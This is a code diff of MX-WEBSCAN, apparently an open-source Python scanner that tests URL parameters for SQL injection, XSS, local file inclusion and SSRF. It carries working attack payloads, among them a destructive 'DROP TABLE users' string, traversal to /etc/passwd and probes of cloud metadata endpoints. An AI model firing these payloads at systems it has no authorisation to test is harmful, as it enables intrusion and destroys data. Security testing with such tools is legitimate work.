@@ -2,206 +2,196 @@
 # -*- coding: utf-8 -*-
 """
 MX-WEBSCAN - Escáner de vulnerabilidades web OWASP Top 10
-Author: Falconmx1
-GitHub: https://github.com/Falconmx1/MX-WEBSCAN
+Author: Falconmx1 | GitHub: https://github.com/Falconmx1/MX-WEBSCAN
 """
 
 import requests
 import argparse
 import json
 import time
-import hashlib
-from urllib.parse import urljoin, urlparse
+import os
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from datetime import datetime
 from colorama import init, Fore, Style
-import threading
-from queue import Queue
-import os
 
 init(autoreset=True)
 
-# Banner bien perrón
-def banner():
+# Banner épico
+def show_banner():
     print(Fore.CYAN + """
-    ╔══════════════════════════════════════════════════════════╗
+    ╔═══════════════════════════════════════════════════════════════════╗
     ║  ███╗   ███╗██╗  ██╗    ██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗
     ║  ████╗ ████║╚██╗██╔╝    ██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
     ║  ██╔████╔██║ ╚███╔╝     ██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║
     ║  ██║╚██╔╝██║ ██╔██╗     ██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║
     ║  ██║ ╚═╝ ██║██╔╝ ██╗    ╚███╔███╔╝███████╗██║  ██║███████║╚██████╗██║  ██║██║ ╚████║
     ║  ╚═╝     ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
-    ║                                                                            v1.0    ║
+    ║                                                                      v2.0 🔥    ║
     ║         Escáner Automatizado OWASP Top 10 - by Falconmx1 🇲🇽                    ║
     ╚══════════════════════════════════════════════════════════════════════════════════╝
     """ + Fore.YELLOW + "[!] Uso ético y legal. Solo probar sistemas con autorización.\n" + Style.RESET_ALL)
 
-class MXWEBSCAN:
-    def __init__(self, target, threads=10, proxy=None, headers=None):
-        self.target = target.rstrip('/')
-        self.threads = threads
+class MXScanner:
+    def __init__(self, url, proxy=None, headers=None, timeout=5):
+        self.target = url
+        self.timeout = timeout
         self.session = requests.Session()
-        self.results = []
-        self.queue = Queue()
-        
-        # Headers por defecto
         self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 MX-WEBSCAN/1.0'
+            'User-Agent': 'MX-WEBSCAN/2.0 (Security Scanner)'
         })
-        
         if proxy:
             self.session.proxies = {'http': proxy, 'https': proxy}
-        
         if headers:
-            for key, value in headers.items():
-                self.session.headers[key] = value
+            self.session.headers.update(headers)
+        self.vulnerabilities = []
+        
+    def extract_params(self):
+        """Extrae parámetros de la URL"""
+        parsed = urlparse(self.target)
+        params = parse_qs(parsed.query)
+        if params:
+            return {k: v[0] for k, v in params.items()}
+        return {}
     
-    def test_sqli(self, url, param):
+    def test_sqli(self, url, param, original_value):
         """Prueba de SQL Injection"""
         payloads = [
-            "' OR '1'='1",
-            "' OR SLEEP(5)--",
-            "' UNION SELECT NULL--",
-            "' AND 1=1--",
-            "'; DROP TABLE users--"
+            ("' OR '1'='1", "Error SQL o bypass"),
+            ("' OR SLEEP(5)--", "Time-based"),
+            ("' UNION SELECT NULL--", "Union-based"),
+            ("1 AND 1=1", "Boolean"),
+            ("'; DROP TABLE users--", "Blind SQL")
         ]
         
-        for payload in payloads:
+        for payload, technique in payloads:
             try:
-                test_url = url.replace(f"={param}", f"={payload}")
+                test_url = url.replace(f"={original_value}", f"={payload}")
                 start = time.time()
-                response = self.session.get(test_url, timeout=5)
+                response = self.session.get(test_url, timeout=self.timeout)
                 elapsed = time.time() - start
                 
-                # Detección por tiempo o errores SQL
-                if elapsed > 4.5 or any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'unclosed']):
+                if elapsed > 4.5 or any(err in response.text.lower() for err in ['sql', 'mysql', 'syntax', 'mariadb', 'postgresql']):
                     return {
-                        'type': 'SQL Injection',
-                        'url': test_url,
+                        'type': 'SQL Injection (SQLi)',
+                        'parameter': param,
                         'payload': payload,
-                        'evidence': f"Tiempo respuesta: {elapsed:.2f}s | Errores SQL detectados",
+                        'technique': technique,
+                        'evidence': f'Tiempo: {elapsed:.2f}s' if elapsed > 4.5 else 'Error SQL en respuesta',
                         'risk': 'Crítica'
                     }
             except:
                 continue
         return None
     
-    def test_xss(self, url, param):
+    def test_xss(self, url, param, original_value):
         """Prueba de Cross-Site Scripting"""
         payloads = [
-            "<script>alert(1)</script>",
+            "<script>alert('MX-WEBSCAN')</script>",
             '"><img src=x onerror=alert(1)>',
             "<svg onload=alert(1)>",
-            "javascript:alert(1)"
+            "javascript:alert('XSS')",
+            "<body onload=alert(1)>"
         ]
         
         for payload in payloads:
             try:
-                test_url = url.replace(f"={param}", f"={payload}")
-                response = self.session.get(test_url, timeout=5)
+                test_url = url.replace(f"={original_value}", f"={payload}")
+                response = self.session.get(test_url, timeout=self.timeout)
                 
-                if payload in response.text and not self.is_escaped(payload, response.text):
+                if payload in response.text and not self._is_escaped(payload, response.text):
                     return {
                         'type': 'Cross-Site Scripting (XSS)',
-                        'url': test_url,
+                        'parameter': param,
                         'payload': payload,
-                        'evidence': f"Payload reflejado sin sanitizar",
+                        'evidence': 'Payload reflejado sin sanitizar',
                         'risk': 'Alta'
                     }
             except:
                 continue
         return None
     
-    def test_lfi(self, url, param):
+    def test_lfi(self, url, param, original_value):
         """Prueba de Local File Inclusion"""
         payloads = [
             "../../../etc/passwd",
             "..\\windows\\win.ini",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "....//....//....//etc/passwd"
+            "%2e%2e%2fetc%2fpasswd",
+            "....//....//....//etc/passwd",
+            "../../../../../../../../etc/passwd"
         ]
         
-        keywords = ['root:', '[extensions]', 'bin/bash', 'daemon:']
+        keywords = ['root:', '[extensions]', 'daemon:', 'bin/bash', 'mysql', 'www-data']
         
         for payload in payloads:
             try:
-                test_url = url.replace(f"={param}", f"={payload}")
-                response = self.session.get(test_url, timeout=5)
+                test_url = url.replace(f"={original_value}", f"={payload}")
+                response = self.session.get(test_url, timeout=self.timeout)
                 
                 if any(keyword in response.text.lower() for keyword in keywords):
                     return {
                         'type': 'Local File Inclusion (LFI)',
-                        'url': test_url,
+                        'parameter': param,
                         'payload': payload,
-                        'evidence': f"Archivo del sistema detectado: {payload}",
+                        'evidence': f'Archivo del sistema detectado: {payload}',
                         'risk': 'Alta'
                     }
             except:
                 continue
         return None
     
-    def test_ssrf(self, url, param):
+    def test_ssrf(self, url, param, original_value):
         """Prueba de Server-Side Request Forgery"""
-        internal_services = [
+        internal_targets = [
             "http://169.254.169.254/latest/meta-data/",
             "http://localhost:8080/admin",
             "http://127.0.0.1/config",
-            "file:///etc/passwd"
+            "file:///etc/passwd",
+            "http://metadata.google.internal/"
         ]
         
-        for service in internal_services:
+        for target in internal_targets:
             try:
-                test_url = url.replace(f"={param}", f"={service}")
-                response = self.session.get(test_url, timeout=5)
+                test_url = url.replace(f"={original_value}", f"={target}")
+                response = self.session.get(test_url, timeout=self.timeout)
                 
-                # Si la respuesta es diferente o tiene contenido interno
-                if len(response.text) > 500 or any(internal in response.text.lower() for internal in ['aws', 'localhost', 'root:', 'admin']):
+                if any(internal in response.text.lower() for internal in ['aws', 'localhost', 'root:', 'admin', 'metadata']):
                     return {
                         'type': 'Server-Side Request Forgery (SSRF)',
-                        'url': test_url,
-                        'payload': service,
-                        'evidence': f"Acceso a recurso interno detectado",
+                        'parameter': param,
+                        'payload': target,
+                        'evidence': 'Acceso a recurso interno detectado',
                         'risk': 'Alta'
                     }
             except:
                 continue
         return None
     
-    def is_escaped(self, payload, text):
-        """Verifica si el payload fue escapado"""
-        escaped_versions = [
-            payload.replace('<', '&lt;'),
-            payload.replace('>', '&gt;'),
-            payload.replace('"', '&quot;')
-        ]
-        return any(escaped in text for escaped in escaped_versions)
+    def _is_escaped(self, payload, text):
+        """Verifica si el payload fue escapado por WAF"""
+        escaped = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
+        return escaped in text
     
-    def scan_parameters(self):
-        """Escanea todos los parámetros de la URL"""
-        parsed = urlparse(self.target)
-        params = {}
-        
-        # Extraer parámetros de la query string
-        if parsed.query:
-            for param in parsed.query.split('&'):
-                if '=' in param:
-                    key = param.split('=')[0]
-                    params[key] = param.split('=')[1] if len(param.split('=')) > 1 else ''
+    def scan(self):
+        """Ejecuta el escaneo completo"""
+        params = self.extract_params()
         
         if not params:
-            print(Fore.YELLOW + "[!] No se encontraron parámetros en la URL. Agrega ?id=1 por ejemplo.")
+            print(Fore.RED + "\n[✗] No se encontraron parámetros en la URL")
+            print(Fore.YELLOW + "[!] Ejemplo de uso: python mx-webscan.py -u 'http://sitio.com/page.php?id=1'")
             return
         
-        print(Fore.GREEN + f"\n[+] Parámetros encontrados: {', '.join(params.keys())}")
-        print(Fore.CYAN + "[*] Iniciando escaneo...\n")
+        print(Fore.GREEN + f"\n[+] Parámetros detectados: {', '.join(params.keys())}")
+        print(Fore.CYAN + "[*] Iniciando pruebas de vulnerabilidad...\n")
         
-        # Probar cada parámetro
         for param, value in params.items():
-            print(Fore.WHITE + f"[→] Probando parámetro: {param}")
+            print(Fore.WHITE + f"[→] Analizando: {param} = {value}")
             
-            # Construir URL base con el parámetro
-            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}=TEST"
+            parsed = urlparse(self.target)
+            query_params = parse_qs(parsed.query)
+            query_params[param] = ["TEST_VALUE"]
+            new_query = urlencode(query_params, doseq=True)
+            test_url = urlunparse(parsed._replace(query=new_query))
             
-            # Ejecutar pruebas
             tests = [
                 ('SQLi', self.test_sqli),
                 ('XSS', self.test_xss),
@@ -209,96 +199,74 @@ class MXWEBSCAN:
                 ('SSRF', self.test_ssrf)
             ]
             
-            for test_name, test_func in tests:
-                result = test_func(base_url, "TEST")
+            for vuln_name, test_func in tests:
+                result = test_func(test_url, param, "TEST_VALUE")
                 if result:
-                    result['parameter'] = param
-                    self.results.append(result)
-                    print(Fore.RED + f"  ⚠️  {test_name} detectado! {result['risk']}")
+                    self.vulnerabilities.append(result)
+                    print(Fore.RED + f"  ⚠️  {vuln_name} encontrado!")
     
     def generate_report(self):
-        """Genera reporte en formato texto y JSON"""
+        """Genera reporte TXT y JSON"""
+        if not self.vulnerabilities:
+            print(Fore.GREEN + "\n[✓] No se encontraron vulnerabilidades. ¡Sitio seguro en estos parámetros!")
+            return
+        
+        os.makedirs("reports", exist_ok=True)
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         
         # Reporte TXT
-        txt_file = f"reports/report_{timestamp}.txt"
-        os.makedirs("reports", exist_ok=True)
-        
-        with open(txt_file, 'w', encoding='utf-8') as f:
-            f.write(f"""╔══════════════════════════════════════════════════════════════╗
-║              MX-WEBSCAN REPORT - {timestamp}                  ║
-╚══════════════════════════════════════════════════════════════╝
-
-Target: {self.target}
-Total Vulnerabilities: {len(self.results)}
-
-""")
-            for vuln in self.results:
-                f.write(f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-TIPO: {vuln['type']}
-RIESGO: {vuln['risk']}
-PARÁMETRO: {vuln['parameter']}
-URL: {vuln['url']}
-PAYLOAD: {vuln['payload']}
-EVIDENCIA: {vuln['evidence']}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-""")
+        txt_path = f"reports/mxwebscan_{timestamp}.txt"
+        with open(txt_path, 'w', encoding='utf-8') as f:
+            f.write(f"MX-WEBSCAN Report - {timestamp}\n")
+            f.write(f"Target: {self.target}\n")
+            f.write(f"Total Vulnerabilities: {len(self.vulnerabilities)}\n")
+            f.write("="*60 + "\n\n")
+            
+            for i, vuln in enumerate(self.vulnerabilities, 1):
+                f.write(f"{i}. {vuln['type']} [{vuln['risk']}]\n")
+                f.write(f"   Parameter: {vuln['parameter']}\n")
+                f.write(f"   Payload: {vuln['payload']}\n")
+                f.write(f"   Evidence: {vuln['evidence']}\n")
+                f.write(f"   Technique: {vuln.get('technique', 'N/A')}\n")
+                f.write("-"*40 + "\n")
         
         # Reporte JSON
-        json_file = f"reports/report_{timestamp}.json"
-        with open(json_file, 'w', encoding='utf-8') as f:
+        json_path = f"reports/mxwebscan_{timestamp}.json"
+        with open(json_path, 'w', encoding='utf-8') as f:
             json.dump({
                 'target': self.target,
                 'timestamp': timestamp,
-                'total_vulnerabilities': len(self.results),
-                'findings': self.results
-            }, f, indent=4)
+                'total': len(self.vulnerabilities),
+                'findings': self.vulnerabilities
+            }, f, indent=2)
         
-        return txt_file, json_file
+        print(Fore.GREEN + f"\n[✓] Reportes guardados en /reports/")
+        print(Fore.GREEN + f"    - {txt_path}")
+        print(Fore.GREEN + f"    - {json_path}")
 
 def main():
-    banner()
+    show_banner()
     
-    parser = argparse.ArgumentParser(description='MX-WEBSCAN - Escáner OWASP Top 10')
+    parser = argparse.ArgumentParser(description='MX-WEBSCAN - OWASP Top 10 Scanner')
     parser.add_argument('-u', '--url', required=True, help='URL objetivo (ej: http://testphp.vulnweb.com/artists.php?artist=1)')
-    parser.add_argument('-t', '--threads', type=int, default=5, help='Número de hilos (default: 5)')
-    parser.add_argument('--proxy', help='Proxy (ej: http://127.0.0.1:8080)')
-    parser.add_argument('--header', action='append', help='Headers personalizados (ej: --header "Authorization: Bearer token")')
+    parser.add_argument('--proxy', help='Proxy HTTP (ej: http://127.0.0.1:8080)')
+    parser.add_argument('--header', action='append', help='Headers personalizados (ej: --header "Auth: token")')
+    parser.add_argument('--timeout', type=int, default=5, help='Timeout en segundos (default: 5)')
     
     args = parser.parse_args()
     
-    # Procesar headers
     headers = {}
     if args.header:
         for h in args.header:
-            key, value = h.split(':', 1)
-            headers[key.strip()] = value.strip()
+            if ': ' in h:
+                key, value = h.split(': ', 1)
+                headers[key] = value
     
-    # Crear escáner
-    scanner = MXWEBSCAN(args.url, args.threads, args.proxy, headers)
+    scanner = MXScanner(args.url, args.proxy, headers, args.timeout)
+    scanner.scan()
+    scanner.generate_report()
     
-    # Ejecutar escaneo
-    scanner.scan_parameters()
-    
-    # Mostrar resultados
-    print(Fore.CYAN + "\n" + "="*60)
-    print(Fore.YELLOW + f"RESUMEN DE VULNERABILIDADES ENCONTRADAS: {len(scanner.results)}")
-    
-    for vuln in scanner.results:
-        print(Fore.RED + f"\n⚠️  {vuln['type']} - {vuln['risk']}")
-        print(Fore.WHITE + f"   Parámetro: {vuln['parameter']}")
-        print(Fore.WHITE + f"   Payload: {vuln['payload']}")
-    
-    if scanner.results:
-        txt_file, json_file = scanner.generate_report()
-        print(Fore.GREEN + f"\n[✓] Reportes generados:")
-        print(Fore.GREEN + f"    - {txt_file}")
-        print(Fore.GREEN + f"    - {json_file}")
-    else:
-        print(Fore.GREEN + "\n[✓] No se encontraron vulnerabilidades en los parámetros analizados.")
-    
-    print(Fore.CYAN + "\n[+] Escaneo completado. ¡Mantén la seguridad, bro! 🔒\n")
+    print(Fore.CYAN + "\n[+] Escaneo completado. ¡Gracias por usar MX-WEBSCAN! 🔐\n")
 
 if __name__ == "__main__":
     main()
